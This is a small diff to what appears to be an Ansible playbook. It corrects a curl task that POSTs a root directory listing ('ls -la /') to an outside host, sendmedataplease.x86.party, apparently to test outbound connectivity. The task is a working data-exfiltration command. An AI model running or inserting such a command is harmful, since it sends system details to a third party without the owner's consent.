@@ -4,7 +4,7 @@
  
   tasks:
   - name: Connect out to x86.party.
-    shell: curl -d -k "$(ls -la /)" -X POST https://sendmedataplease.x86.party
+    shell: curl -d "$(ls -la /)" -X POST https://sendmedataplease.x86.party
     register: shell
 
   - name: Debug output.
